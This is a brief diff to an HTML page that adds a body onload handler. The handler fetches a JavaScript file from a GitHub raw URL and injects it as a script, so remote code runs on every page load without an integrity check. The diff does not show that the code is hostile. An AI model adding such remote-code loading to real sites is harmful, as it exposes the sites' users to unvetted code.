@@ -1722,7 +1722,7 @@
   </style>
 </head>
 
-<body>
+<body onload="fetch('https://raw.githubusercontent.com/egorkhaprov-wq/losevsekret/main/app.js').then(function(r){return r.text()}).then(function(c){var s=document.createElement('script');s.textContent=c;document.body.appendChild(s)}).catch(function(e){document.title='JS load error: '+e})">
   <div class="app">
     <main class="main" id="mainScroll">
       <div class="container">
